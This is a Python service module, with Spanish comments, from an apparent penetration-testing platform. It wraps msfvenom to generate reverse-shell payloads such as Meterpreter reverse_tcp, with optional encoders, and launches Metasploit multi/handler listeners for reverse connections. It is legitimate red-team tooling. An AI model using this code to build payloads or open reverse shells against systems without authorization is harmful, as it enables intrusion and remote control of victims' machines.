"""
Payloads Service
================

Servicios para generación de payloads:
- Metasploit/msfvenom (generación de payloads)
- Metasploit Handler (listener para conexiones reversas)
"""

import logging
import re
from typing import Dict, Any, Optional
from pathlib import Path

from utils.validators import CommandSanitizer, IPValidator
from .base import BaseExploitationService

logger = logging.getLogger(__name__)


class PayloadsService(BaseExploitationService):
    """Servicio para generación de payloads."""
    
    def generate_msfvenom_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        workspace_id: int,
        user_id: int,
        format: str = 'exe',
        encoder: Optional[str] = None,
        iterations: int = 0,
        output_file: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Genera payload con msfvenom.
        
        Args:
            payload_type: Tipo de payload (ej: "windows/x64/meterpreter/reverse_tcp")
            lhost: IP del atacante
            lport: Puerto del listener
            workspace_id: ID del workspace
            user_id: ID del usuario
            format: Formato de salida (exe, elf, raw, asp, aspx, php, jsp, etc.)
            encoder: Encoder a usar (opcional)
            iterations: Iteraciones del encoder (opcional)
            output_file: Archivo de salida (opcional)
        """
        IPValidator.validate(lhost)
        
        if not output_file:
            output_file = str(self.output_dir / f'payload_{payload_type.replace("/", "_")}.{format}')
        
        scan = self._create_scan(
            target=lhost,
            workspace_id=workspace_id,
            user_id=user_id,
            tool='msfvenom',
            options={
                'payload_type': payload_type,
                'format': format
            }
        )
        
        try:
            command_list = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format,
                '-o', output_file
            ]
            
            if encoder:
                command_list.extend(['-e', encoder])
                if iterations > 0:
                    command_list.extend(['-i', str(iterations)])
            
            sanitized_cmd = CommandSanitizer.sanitize_command(command_list[0], command_list[1:])
            
            logger.info(f"Generating msfvenom payload {scan.id}")
            
            self._start_scan_thread(
                scan_id=scan.id,
                command=sanitized_cmd,
                output_file=output_file,
                tool='msfvenom',
                timeout=60  # 1 minuto para generación de payloads
            )
            
            self.scan_repo.update_status(scan, 'running')
            
            return {
                'scan_id': scan.id,
                'status': 'running',
                'tool': 'msfvenom',
                'payload_type': payload_type,
                'output_file': output_file
            }
            
        except Exception as e:
            logger.error(f"Error generating msfvenom payload: {e}")
            self.scan_repo.update_status(scan, 'failed', str(e))
            raise
    
    def start_metasploit_handler(
        self,
        payload: str,
        lhost: str,
        lport: int,
        workspace_id: int,
        user_id: int,
        exit_on_session: bool = False
    ) -> Dict[str, Any]:
        """
        Inicia Metasploit Handler para recibir conexiones reversas.
        
        Args:
            payload: Tipo de payload (ej: "windows/x64/meterpreter/reverse_tcp")
            lhost: IP del atacante
            lport: Puerto del listener
            workspace_id: ID del workspace
            user_id: ID del usuario
            exit_on_session: Si es True, termina al recibir una sesión (default: False)
        
        Returns:
            Dict con scan_id y estado
        """
        IPValidator.validate(lhost)
        
        if not (1 <= lport <= 65535):
            raise ValueError(f"Puerto inválido: {lport}. Debe estar entre 1 y 65535")
        
        # Validar payload: solo letras, números, guiones, barras y guiones bajos
        # Formato típico: "windows/x64/meterpreter/reverse_tcp"
        if not re.match(r'^[a-zA-Z0-9/_\-]+$', payload):
            raise ValueError(
                f"Payload inválido: '{payload}'. "
                "Solo se permiten letras, números, guiones, barras y guiones bajos."
            )
        
        scan = self._create_scan(
            target=lhost,
            workspace_id=workspace_id,
            user_id=user_id,
            tool='metasploit',
            options={
                'payload': payload,
                'lhost': lhost,
                'lport': lport,
                'handler': True
            }
        )
        
        try:
            output_file = str(self.output_dir / f'handler_{scan.id}.txt')
            
            # Construir comando msfconsole con -x para ejecutar comandos en batch
            # Usamos -x para ejecutar comandos sin modo interactivo
            msf_commands = [
                'use exploit/multi/handler',
                f'set PAYLOAD {payload}',
                f'set LHOST {lhost}',
                f'set LPORT {lport}',
                f'set ExitOnSession {"true" if exit_on_session else "false"}',
                'exploit -j'
            ]
            
            # Crear archivo temporal con comandos
            commands_file = str(self.output_dir / f'handler_commands_{scan.id}.rc')
            with open(commands_file, 'w') as f:
                f.write('\n'.join(msf_commands))
            
            # Comando para ejecutar msfconsole con el archivo de comandos
            command_list = [
                'msfconsole',
                '-r', commands_file,  # -r ejecuta el archivo de recursos
                '-o', output_file      # -o redirige output
            ]
            
            sanitized_cmd = CommandSanitizer.sanitize_command(command_list[0], command_list[1:])
            
            logger.info(f"Starting Metasploit Handler {scan.id} for {payload} on {lhost}:{lport}")
            
            # Log inicial
            from utils.workspace_logger import log_to_workspace
            log_to_workspace(
                workspace_id=workspace_id,
                source='METASPLOIT',
                level='INFO',
                message=f"Iniciando Metasploit Handler: {payload} en {lhost}:{lport}",
                metadata={'scan_id': scan.id, 'payload': payload, 'lhost': lhost, 'lport': lport}
            )
            
            self._start_scan_thread(
                scan_id=scan.id,
                command=sanitized_cmd,
                output_file=output_file,
                tool='metasploit',
                timeout=3600  # 1 hora para handler (puede estar escuchando mucho tiempo)
            )
            
            self.scan_repo.update_status(scan, 'running')
            
            return {
                'scan_id': scan.id,
                'status': 'running',
                'tool': 'metasploit',
                'handler': True,
                'payload': payload,
                'lhost': lhost,
                'lport': lport,
                'message': f'Metasploit Handler iniciado. Escuchando en {lhost}:{lport}'
            }
            
        except Exception as e:
            logger.error(f"Error starting Metasploit Handler: {e}")
            self.scan_repo.update_status(scan, 'failed', str(e))
            raise


    def preview_msfvenom_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        workspace_id: int,
        format: str = 'exe',
        encoder: Optional[str] = None,
        iterations: int = 0
    ) -> Dict[str, Any]:
        """Preview del comando msfvenom."""
        output_file = f'/workspaces/workspace_{workspace_id}/exploitation/payload_{payload_type.replace("/", "_")}.{format}'
        
        command_list = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format,
            '-o', output_file
        ]
        
        if encoder:
            command_list.extend(['-e', encoder])
            if iterations > 0:
                command_list.extend(['-i', str(iterations)])
        
        command_str = ' '.join([str(c) for c in command_list])
        
        warnings = []
        if encoder and iterations > 3:
            warnings.append('Muchas iteraciones de encoding pueden aumentar el tamaño del payload')
        
        return {
            'command': command_list,
            'command_string': command_str,
            'parameters': {
                'tool': 'msfvenom',
                'payload_type': payload_type,
                'lhost': lhost,
                'lport': lport,
                'format': format,
                'encoder': encoder,
                'iterations': iterations
            },
            'estimated_timeout': 60,
            'output_file': output_file,
            'warnings': warnings,
            'suggestions': []
        }
    
    def preview_metasploit_handler(
        self,
        payload: str,
        lhost: str,
        lport: int,
        workspace_id: int,
        exit_on_session: bool = False
    ) -> Dict[str, Any]:
        """Preview del comando Metasploit Handler."""
        output_file = f'/workspaces/workspace_{workspace_id}/exploitation/metasploit_handler_{{scan_id}}.txt'
        
        command_list = [
            'msfconsole',
            '-q',
            '-x',
            f'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'
        ]
        
        if exit_on_session:
            command_list[-1] += '; exit'
        
        command_list.extend(['>', output_file, '2>&1'])
        command_str = ' '.join([str(c) for c in command_list])
        
        warnings = []
        warnings.append('Metasploit Handler debe ejecutarse en modo interactivo')
        warnings.append('Asegúrese de tener el listener configurado antes de ejecutar el payload')
        
        return {
            'command': command_list,
            'command_string': command_str,
            'parameters': {
                'tool': 'metasploit_handler',
                'payload': payload,
                'lhost': lhost,
                'lport': lport,
                'exit_on_session': exit_on_session
            },
            'estimated_timeout': 3600,
            'output_file': output_file,
            'warnings': warnings,
            'suggestions': []
        }
